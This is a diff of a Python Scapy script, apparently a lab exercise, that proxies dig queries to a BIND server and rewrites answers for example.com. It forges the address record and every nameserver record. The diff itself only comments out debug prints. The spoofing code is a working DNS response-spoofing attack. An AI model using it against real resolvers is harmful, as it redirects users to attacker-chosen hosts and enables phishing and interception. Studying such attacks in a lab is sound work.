@@ -33,14 +33,13 @@ def spoofPacket(packet):
 	#and we do the same for the name server by overriding rdata and rrname
 	#Note: there could be multiple NS, so we need to do this for all of them
 	packet.an[DNSRR].rdata = spoofIP
-	print ("Spoofed Ipv4: ", packet.an)
+	#print ("Spoofed Ipv4: ", packet.an)
 
 	numNameServers = packet[DNS].nscount
 	for i in range (numNameServers):
 		packet.ns[DNSRR][i].rdata = spoofNS
 		packet.ns[DNSRR][i].rrname = spoofNS
-		print ("Spoofed NS: ",packet[DNS].ns)
-
+		#print ("Spoofed NS: ",packet[DNS].ns)
 	return packet
 
 if __name__ == '__main__':
@@ -49,23 +48,22 @@ if __name__ == '__main__':
 	sock.bind(('', port))
 	while True:
 		#receive a DNS query request from dig
-		print("Waiting for a request")
+		#print("Waiting for a request")
 		clientRequest, addr = sock.recvfrom(4096)
-		print(addr)
-		print("Received dig request")
+		#print(addr)
+		#print("Received dig request")
 		dnsPacket = DNS(clientRequest)
-		print ("Sending to BIND")
+		#print ("Sending to BIND")
 		sock.sendto(str(dnsPacket), (addr[0], dns_port))
 		#Wait for upstream BIND server's response
-		print ("Waiting for BIND reply")
+		#print ("Waiting for BIND reply")
 		response = sock.recv(4096)
 		response = DNS(response)
 		#spoof the DNS packet if we need to
 		name = response[DNSQR].qname
-		print("Query name is :", name)
-		print(SPOOF)
+		#print("Query name is :", name)
+		#print(SPOOF)
 		if (SPOOF and name == 'example.com.'):
-			print("Im here")
 			response = spoofPacket(response)
 		'''
 		print "\n***** Packet Received from Remote Server *****"
